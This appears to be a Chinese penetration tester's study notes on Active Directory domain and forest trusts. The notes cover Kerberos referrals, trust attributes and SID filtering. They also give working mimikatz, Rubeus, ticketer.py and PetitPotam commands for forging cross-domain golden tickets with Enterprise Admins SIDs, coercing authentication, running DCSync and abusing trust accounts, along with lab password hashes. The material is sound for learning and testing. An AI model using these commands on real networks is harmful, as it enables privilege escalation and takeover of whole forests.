# Domain Trust


[Trust Technologies: Domain and Forest Trusts | Microsoft Docs](https://docs.microsoft.com/zh-cn/previous-versions/windows/it-pro/windows-server-2003/cc759554(v=ws.10)?redirectedfrom=MSDN)

[How Domain and Forest Trusts Work | Microsoft Docs](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc773178(v=ws.10)?redirectedfrom=MSDN)

[It’s All About Trust – Forging Kerberos Trust Tickets to Spoof Access across Active Directory Trusts – Active Directory Security (adsecurity.org)](https://adsecurity.org/?p=1588)

[A Guide to Attacking Domain Trusts | by Will Schroeder | Medium](https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d)

[From Domain Admin to Enterprise Admin - Red Teaming Experiments (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

[Active Directory forest trusts part 1 - How does SID filtering work? - dirkjanm.io](https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/)

[Attack Trusts - Pentester's Promiscuous Notebook (snovvcrash.rocks)](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/attack-trusts)

[SID filter as security boundary between domains? (Part 7) - Trust account attack - from trusting to trusted — Improsec | improving security](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

[SID filter as security boundary between domains? (Part 6) - Schema change trust attack - from child to parent — Improsec | improving security](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent)

[SID filter as security boundary between domains? (Part 5) - Golden GMSA trust attack - from child to parent — Improsec | improving security](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)

[SID filter as security boundary between domains? (Part 3) - SID filtering explained — Improsec | improving security](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-3-sid-filtering-explained)

[SID filter as security boundary between domains? (Part 2) – Known AD attacks - from child to parent — Improsec | improving security](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-2-known-ad-attacks-from-child-to-parent)

## 基础概念

单项信任：A信任B，B不信任A。B的用户可以访问A的资源，A的用户不能访问B的资源

双向信任：AB互相信任，AB用户可互相访问对方的资源。

传递信任：AB互相信任，BC互相信任，且都是可传递的信任，AC就互相信任

非传递信任：AB互相信任，BC互相信任，不是可传递的信任，AC就不互相信任

同一林中子域与父域默认建立的是双向传递信任。

外部信任不可传递

林信任可传递

![image.png](https://s2.loli.net/2022/04/20/1ymuSrFoTMQe9K5.png)

域`ADC`有两个子域。`A.ADC`和`B.ADC`。

`A.ADC`和`B.ADC`和父域`ADC.COM`都是双向传递信任。所以`A.ADC`和`B.ADC`也是双向传递信任，他们的子域也依然可以双向传递信任。

`BDC`与`A.ADC`双向信任。不可传递。

`CDC`与`ADC`双向林信任。可传递。CDC域中用户可以访问ADC的所有资源包括子域，由于外部信任不可传递，CDC不可访问BDC的资源


微软官方文档的说明[域和林信任如何工作 | 微软文档 (microsoft.com)](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc773178(v=ws.10)?redirectedfrom=MSDN)

## 同一林的跨域Kerberos认证

![基于域信任的 Kerberos 身份验证过程](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/images/cc773178.ce3a1d95-4087-4ebd-b17f-c361c7d3bce7(ws.10).jpeg "基于域信任的 Kerberos 身份验证过程")

1. User1 使用来自 europe.tailspintoys.com 域的凭据登录到 Workstation1。作为此过程的一部分，身份验证域控制器向用户 1 颁发一个授予票证 (TGT)。User1 需要此票证才能对资源进行身份验证。然后，用户尝试访问位于 asia.tailspintoys.com 域中的FileServer1上的共享资源 (\\fileserver1\share)。
2. Workstation1 联系其域 (ChildDC1) 中域控制器上的 Kerberos 密钥分发中心 (KDC) 并请求 FileServer1 服务主体名称 (SPN) 的服务票证。
3. ChildDC1 在其域数据库中找不到 SPN，并查询全局编录以查看林中是否有任何域包含此 SPN。全局编录将请求的信息发送回 ChildDC1。
4. ChildDC1 将推荐发送到 Workstation1。
5. Workstation1 与 ForestRootDC1（其父域）中的域控制器联系，以获取对 Child2 域中域控制器 (ChildDC2) 的引用。ForestRootDC1 将引用发送到Workstation1。
6. Workstation1 与 ChildDC2 上的 KDC 联系，并为用户协商一张票证以获取对 FileServer1 的访问权限。
7. Workstation1 获得服务票证后，会将票证发送到 FileServer1，FileServer1 读取用户的安全凭证并相应地构造访问令牌。

每个域都有自己的一组安全策略来管理对资源的访问。这些策略不会从一个域跨越到另一个域。

## 不同林中的跨域Kerberos认证

![基于林信任的 Kerberos 身份验证过程](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/images/cc773178.34190988-69a3-4816-8aca-f7534b1c762f(ws.10).jpeg "基于林信任的 Kerberos 身份验证过程")

1. User1 使用来自 europe.tailspintoys.com 域的凭据登录到 Workstation1。然后，用户尝试访问位于 usa.wingtiptoys.com 林中的 FileServer1 上的共享资源。
2. Workstation1 联系其域 (ChildDC1) 中域控制器上的 Kerberos 密钥分发中心 (KDC) 并请求 FileServer1 SPN 的服务票证。
3. ChildDC1 在其域数据库中找不到 SPN，并查询全局编录以查看 tailspintoys.com 林中的任何域是否包含此 SPN。因为全局编录仅限于其自己的林，所以找不到 SPN。然后，全局编录检查其数据库中有关与其林建立的任何林信任的信息，如果找到，它将林信任受信任域对象 (TDO) 中列出的名称后缀与目标 SPN 的后缀进行比较以查找一场比赛。找到匹配项后，全局编录会向 ChildDC1 提供路由提示。路由提示有助于将身份验证请求定向到目标林，并且仅在所有传统身份验证通道（本地域控制器和全局编录）都无法找到 SPN 时使用。
4. ChildDC1 将其父域的引用发送回 Workstation1。
5. Workstation1 与 ForestRootDC1（其父域）中的域控制器联系，以获取到 wingtiptoys.com 林的林根域中的域控制器 (ForestRootDC2) 的引用。
6. Workstation1 联系wingtiptoys.com 森林中的ForestRootDC2 以获取所请求服务的服务票证。
7. ForestRootDC2 联系其全局编录以查找 SPN，全局编录找到 SPN 的匹配项并将其发送回 ForestRootDC2。
8. ForestRootDC2 然后将 usa.wingtiptoys.com 的推荐发送回 Workstation1。
9. Workstation1 联系 ChildDC2 上的 KDC 并协商 User1 的票证以获得对 FileServer1 的访问权限。
10. Workstation1 获得服务票证后，会将服务票证发送到 FileServer1，FileServer1 读取 User1 的安全凭证并相应地构造访问令牌。

## Power View

![image.png](https://s2.loli.net/2022/04/20/wIFuh6Pj9VtEsQA.png)

### TrustType

信任类型

* **DOWNLEVEL** (0x00000001) — 未运行 Active Directory 的受信任的 Windows 域。 在PowerView 中以**WINDOWS_NON_ACTIVE_DIRECTORY**的形式输出。
* **UPLEVEL** (0x00000002) — 一个运行 Active Directory 的受信任的 Windows 域。在 PowerView 中输出为**WINDOWS_ACTIVE_DIRECTORY 。**
* **MIT** (0x00000003) — 运行非 Windows (*nix)、符合 RFC4120 的 Kerberos 分发的受信任域。由于 MIT 发布 RFC4120，这被标记为 MIT。

### TrustAttributes

信任属性

* **NON_TRANSITIVE** (0x00000001) — 不能传递使用信任。也就是说，如果 DomainA 信任 DomainB 而 DomainB 信任 DomainC，那么 DomainA 不会自动信任 DomainC。此外，如果信任是不可传递的，那么您将无法从非传递点的链上的信任中查询任何 Active Directory 信息。外部信任是隐含的不可传递的。
* **UPLEVEL_ONLY** (0x00000002) — 只有 Windows 2000 操作系统和更新的客户端可以使用信任。
* **QUARANTING_DOMAIN** (0x00000004) — SID 过滤已启用（稍后会详细介绍）。为简单起见，使用 PowerView输出为**FILTER_SIDS 。**
* **FOREST_TRANSITIVE** (0x00000008) — 至少运行域功能级别 2003 或更高级别的两个域林的根之间的跨林信任。
* **CROSS_ORGANIZATION** (0x00000010) — 信任不属于组织的域或林，它添加了 OTHER_ORGANIZATION SID。这有点奇怪。我不记得在现场遇到过这个标志，但根据[这篇文章](https://imav8n.wordpress.com/2008/07/30/trust-attribute-cross_organization-and-selective-auth/)，这意味着启用了选择性身份验证安全保护。有关更多信息，请查看[此 MSDN 文档](https://technet.microsoft.com/en-us/library/cc755321(v=ws.10).aspx#w2k3tr_trust_security_zyzk)。
* **WITHIN_FOREST** (0x00000020) — 受信任域在同一个林中，表示父->子或交叉链接关系
* **TREAT_AS_EXTERNAL** (0x00000040) — 出于信任边界的目的，信任将被视为外部信任。根据[文档](https://msdn.microsoft.com/en-us/library/cc223779.aspx)，“ *如果设置了此位，则出于 SID 过滤的目的，对域的跨林信任将被视为外部信任。*  ***跨林信任的过滤比外部信任更严格***  *。此属性将那些跨林信任放松为等同于外部信任。* ” 这听起来很诱人，我不能 100% 确定此声明的安全含义¯\_(ツ)_/¯ 但如果有任何新信息出现，我会更新这篇文章。
* **USES_RC4_ENCRYPTION** (0x00000080) — 如果 TrustType 是 MIT，则指定支持 RC4 密钥的信任。
* **USES_AES_KEYS** (0x00000100) — 未在链接的 Microsoft 文档中列出，但根据我在网上找到的[一些文档](http://krbdev.mit.edu/rt/Ticket/Display.html?id=5477)，它指定 AES 密钥用于加密 KRB TGT。[](https://retep998.github.io/doc/winapi/ntsecapi/constant.TRUST_ATTRIBUTE_TRUST_USES_AES_KEYS.html)
* **CROSS_ORGANIZATION_NO_TGT_DELEGATION** (0x00000200) — “[*如果设置了此位，则不得信任在此信任下授予的票证进行委托。*](https://msdn.microsoft.com/en-us/library/cc223779.aspx)” 这在[[MS-KILE] 3.3.5.7.5](https://msdn.microsoft.com/en-us/library/cc233949.aspx)（跨域信任和推荐）中有更多描述。
* **PIM_TRUST** (0x00000400) —“[*如果设置了此位和 TATE（视为外部）位，则出于 SID 过滤的目的，对域的跨林信任将被视为特权身份管理信任。*](https://msdn.microsoft.com/en-us/library/cc223779.aspx)” 根据[[MS-PAC] 4.1.2.2](https://msdn.microsoft.com/en-us/library/cc237940.aspx)（SID 过滤和声明转换），“[*域可以由林外的域进行外部管理。信任域允许其林本地的 SID 通过 PrivilegedIdentityManagement 信任。*](https://msdn.microsoft.com/en-us/library/cc237940.aspx)” 虽然我在现场没有看到这个，而且它只支持域功能级别 2012R2 及更高版本，但它也值得进一步调查:)

### TrustDirection

信任方向：

Bidirectional： 双向

Outbound：对外信任，外部域可访问本域

inbound：对内信任 ，本域可访问外部域

## 4张票据

### 制作keytab

wireshark可以导入keytab文件来解密Kerberos认证中加密的数据。keytab就类似一个密码表。因为PAC是用krbtgt的hash加密，所以我们有了krbtgt的hash，制作keytab，导入wireshark就可以看见PAC中的每个结构了。

https://mp.weixin.qq.com/s/eTiQRoEh1DvNGEuPErYsAw。这篇文章讲了通过ntds.dit和system.hive来制作keytab，经过我的测试有不少坑。不同版本的Windows Server，ntds.dit的结构不一样。如果你的域控是Windows server 2008。可以试试这种方法，我搞了大半天。最终也没成功。

我更推荐dirkjanm的脚本，[dirkjanm/forest-trust-tools: Proof-of-concept tools for my AD Forest trust research (github.com)](https://github.com/dirkjanm/forest-trust-tools)

我们可以使用secretsdump或者mimikatz挨个导出我们需要的在用户hash。

然后添加到keytab.py中112行。

运行keytab.py生成keytab文件。导入wireshark即可解密Kerberos认证中的各个结构。

### 认证流程

在`B.ADC`运行`Get-DomainComputer -domain a.adc.com` 查询A.ADC中的计算机

![image.png](https://s2.loli.net/2022/04/20/g7ZNCGv9sDaTYxM.png)

klist查看当前票据。

![image.png](https://s2.loli.net/2022/04/20/hZmDFgH4kcGnUYt.png)

IIS01是A.ADC域控，IIS02是B.ADC 域控，DC01是父域ADC域控

一共4个票据。首先第三个票据（`#2`）是B.ADC域管的TGT。

**第二个票据**：

客户端: Administrator @ B.ADC.COM  
服务器: krbtgt/ADC.COM @ B.ADC.COM

调用的KDC是B.ADC的域控。

也就是说请求者先拿着自己的TGT（第三张票据）去找自己的域控（B.ADC）请求A.ADC的服务（这里是`ldap/IIS01.A.adc.com`）。域控发现这个服务是另一个子域的。就用自己与父域的信任密钥加密TGT，返回给我们，让我们去找父域ADC。返回的这张票据就是第二张票据

**第一张票据**：

客户端: Administrator @ B.ADC.COM  
服务器: krbtgt/A.ADC.COM @ ADC.COM

调用的 KDC: DC01.adc.com

拿着第二张票据去父域请求A.ADC的跨域TGT。这个也就是我们抓到的第一个TGS-REQ。

![image.png](https://s2.loli.net/2022/04/20/BsaHZuF4wSfcj5X.png)

TGS-REP返回的就是第一张票据

![image.png](https://s2.loli.net/2022/04/20/a6y8QXvEUorYhDP.png)

**第四张票据**

客户端: Administrator @ B.ADC.COM  
服务器: ldap/IIS01.A.adc.com/A.adc.com @ A.ADC.COM  
调用的 KDC: IIS01.A.adc.com

拿着父域给的跨域TGT，去A.ADC请求对应服务的ST。

![image.png](https://s2.loli.net/2022/04/20/sKcdueAmxMLGrqJ.png)

返回的就是第四张跨域的服务票据

![image.png](https://s2.loli.net/2022/04/20/r8O2RDqfPWGhBw5.png)

那么这里就有一个问题。父子之间的跨域的TGT怎么验证的，还是用spn指定的服务的hash加密的吗？

### 信任密钥

我们使用secretsdump.py把导出三个域控的hash，对比发现下面几个hash

```c#
ADC.COM
A$:1164:aad3b435b51404eeaad3b435b51404ee:b54f5c768bff145ca1c094a6d9751f09:::
B$:1165:aad3b435b51404eeaad3b435b51404ee:b88a3a068365e1ecdddd7348f195444d:::

B.ADC.COM
ADC$:1103:aad3b435b51404eeaad3b435b51404ee:b88a3a068365e1ecdddd7348f195444d:::

A.ADC.COM
ADC$:1103:aad3b435b51404eeaad3b435b51404ee:b54f5c768bff145ca1c094a6d9751f09:::
```

可以看到父域和子域之间存在一个相同的hash。我们把这些hash加到我们制作的keytab中。导入wires hark。成功解密，可以看到加密的hash是b88a3a068365e1ecdddd7348f195444d

![image.png](https://s2.loli.net/2022/04/20/hMRAodzXKNGWLuP.png)

同样的，父域给我们的票据是使用b54f5c768bff145ca1c094a6d9751f09加密

![image.png](https://s2.loli.net/2022/04/20/hp6vFIrGQ2lsKOe.png)

这两个hash就是信任密钥（trust key）。


这样我们再来看微软的这张同一林下的跨域Kerberos认证的图。是不是一目了然了呢。

![基于域信任的 Kerberos 身份验证过程](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/images/cc773178.ce3a1d95-4087-4ebd-b17f-c361c7d3bce7(ws.10).jpeg "基于域信任的 Kerberos 身份验证过程")


## SID筛选

林信任和同一林下的父子信任默认sid筛选不启用。但林信任确实过滤一些sid

```bash
查询
netdom trust /d:cdc.com adc.com /Quarantine:
```

创建一个外部信任域，sid筛选默认启用，信任关系不可传递

![image.png](https://s2.loli.net/2022/04/20/vjR7iwfrT3qPBYO.png)

### SIDHistory

> 根据微软的解释，SID History 是一个支持迁移方案的属性，每个用户帐户都有一个关联的安全标识符 (SID)，用于跟踪安全主体和帐户在连接到资源时的访问权限。SID 历史记录允许将另一个帐户的访问有效地克隆到另一个帐户，并且对于确保用户在从一个域移动（迁移）到另一个域时保留访问权限非常有用。  
> 而一个账户可以在SID-History Active Directory 属性中保存额外的 SID ，从而允许域之间进行可相互操作的帐户迁移（例如，SID-History 中的所有值都包含在访问令牌中）。  
> 为了达到SID History攻击的目的，我们的将使用域管理员权限，将获取到的有权限的SID值插入到SID历史记录中，以实现模拟任意用户/组（例如Enterprise Admins）的权限，达到跨域提权目的。
>

### 过滤规则

[[MS-PAC]：SID 过滤和声明转换 | 微软文档 (microsoft.com)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280?redirectedfrom=MSDN)

同一个林，不过滤sid。

林信任：默认启用sid筛选；过滤掉所有不存在发起者所在的林中的sid。也就是说林A的某个用户对林B的资源发起访问，林B返回给该用户的服务票据的PAC中extra sids只包含林A存在的组的sid。林B中的sid会被删除。


Dirk-jan在它的文章中提到的启用sidhistory时的sid筛选机制，但我的环境sidhistory一直启动不成功。

> [Active Directory forest trusts part 1 - How does SID filtering work? - dirkjanm.io](https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/)
>
> netdom有个enablesidhistory选项，再林B开启后，就不会过滤来自林A请求的sid。
>
> ```lsadump::dcsync
> netdom trust /d:forest-a.local forest-b.local /enablesidhistory:yes
> ```
>
> 然后两个林之间的信任关系就是`TREAT_AS_EXTERNAL`。这时候林信任就被视为外部信任。不会过滤掉本域的sid。
>
> * 但是会删除Domain Admins/Enterprise Admins/Account Operators 组。
>
> * Domain Admins 组未添加到`ResourceGroup`PAC 的一部分，即使组 3101 是该组的直接成员。这是因为 Domain Admins 组是一个**全局**组，而PAC 中只添加了**域本地组。**
>
> 如果跨森林信任启用 SID 历史记录，您可以 **欺骗任何 RID >1000的组！** 在大多数环境中，这将允许攻击者破坏森林。例如，在许多设置中允许将[权限升级到 DA](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)的 Exchange 安全组都具有大于 1000 的 RID。此外，许多组织将为工作站管理员或帮助台提供自定义组，这些组在工作站或服务器上被赋予本地管理员权限。例如，我刚刚为该`IT-Admins`组（具有 RID 3101，这是我们的黄金票据的一部分）授予了`forest-b-server`机器上的管理员权限。
>

**一些不会被过滤的sid：**

>
> S-1-5-9                       Enterprise Domain Controllers
>
> S-1-4                           非唯一权威
>
> S-1-5-15                      这个组织
>
> S-1-5-21-0-0-0-496    复合认证
>
> S-1-5-21-0-0-0-497    索赔有效
>
> S-1-5-1000-                其他组织
>
> S-1-5-R-R>1000         可扩展S-1-10护照管理局
>


## 跨域

我们拿到了子域的域管权限。想要进一步拿下父域。但子域的域管并不是父域的域管。怎么办呢？

### 跨域金票

在子域控上导出krbtgt的hash，制作金票。也可以用信任密钥加密。其实这俩一样，只不过换了个hash加密而已。

```c#
lsadump::lsa /inject /name:krbtgt

kerberos::golden /domain:b.adc.com /user:TB /id:1104 /groups:513 /sid:S-1-5-21-380941772-2247100965-3625425370 /sids:S-1-5-21-3427068280-546657318-2538748504-519,S-1-5-9 /krbtgt:8bd3cbe5d54eb2d1c9274d940c3d165a /ptt 

kerberos::golden /user:administrator /id:500 /sid:S-1-5-21-3472340072-1697025292-3535703670 /sids:S-1-5-21-3427068280-546657318-2538748504-519,S-1-5-9,S-1-5-21-380941772-2247100965-3625425370-512,S-1-5-15 /krbtgt:922d9ee0c87f0aed5c72222ee1d47d0a /ptt /domain:a.adc.com

python3 ticketer.py -nthash 922d9ee0c87f0aed5c72222ee1d47d0a -user-id 1104 -groups 513 -domain a.adc.com -domain-sid S-1-5-21-3472340072-1697025292-3535703670 -extra-sid S-1-5-21-3427068280-546657318-2538748504-519,S-1-5-9 "TA"

Rubeus.exe asktgt /user:TB /domain:b.adc.com /aes256:e725be784d9e460e6dfc89074c5a246b8de5e54b11ab0fb2f3e9918d815383a6 /opsec /nowrap
Rubeus.exe asktgs /service:krbtgt/adc.com /domain:b.adc.com /dc:iis02.b.adc.com /ticket:
Rubeus.exe asktgs /service:cifs/DC01.adc.com /domain:adc.com /dc:DC01.adc.com /nowrap /ticket:
```

![image.png](https://s2.loli.net/2022/04/20/y3PqLmZXr4IeFwV.png)


### 非约束委派

学非约束委派时就提到过。域控默认都是非约束委派的机器，通过RPC强制父域控返回身份认证，在子域控上哪到父域机器账户的TGT。

这里需要注意的是，这种手法同样适用于林信任，但在外部信任不可用。如果开启了sid筛选，也抓不到TGT

```lsadump::dcsync
python3 PetitPotam.py  dc04.cdc.com 10.10.10.10 -u administrator -p sss@123

Rubeus.exe monitor /interval:1 /nowrap
Rubeus.exe  ptt /ticket:....................

lsadump::dcsync /user:adc\krbtgt /domain:adc.com
```

![image.png](https://s2.loli.net/2022/04/20/lYVTNSFQrqXJhOk.png)

### 信任账户攻击

很好理解的攻击方式。一张图就可以解决。

![image.png](https://s2.loli.net/2022/04/20/L3yQi14UeCbsNgh.png)

B单向信任A，A可以访问B的资源，B访问不了A的资源。

但我们知道，两个域建立信任后再每一个域都会有一个信任账户，这两账户的RC4hash是相同的。

而这个信任账户属于domain users组。那我们不就能获取另一个域的一个普通用户的凭据，即使他不信任本域。

![image.png](https://s2.loli.net/2022/04/20/kjgDsNWraz1TA4Q.png)

```bash
Rubeus.exe asktgt /user:ADC$ /rc4:57bfc5b3ca85281f3d504f0fa355c6e5 /dc:DC04.cdc.com /domain:cdc.com /ptt
```

有了凭据，那我们就可以对一个不信任我们的域进行

* AD枚举/攻击路径发现
* 网络共享枚举
* 创建 DNS 记录
* 将计算机加入域
* 利用证书模板
* kerberoasting
* 以及更多...

### 黄金GMSA

这个就没怎怎么看了，有兴趣自己学把，作者还提到其他几种方法，具体看文章

[Introducing the Golden GMSA Attack | Semperis](https://www.semperis.com/blog/golden-gmsa-attack/)

[SID filter as security boundary between domains? (Part 4) - Bypass SID filtering research — Improsec | improving security](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research)

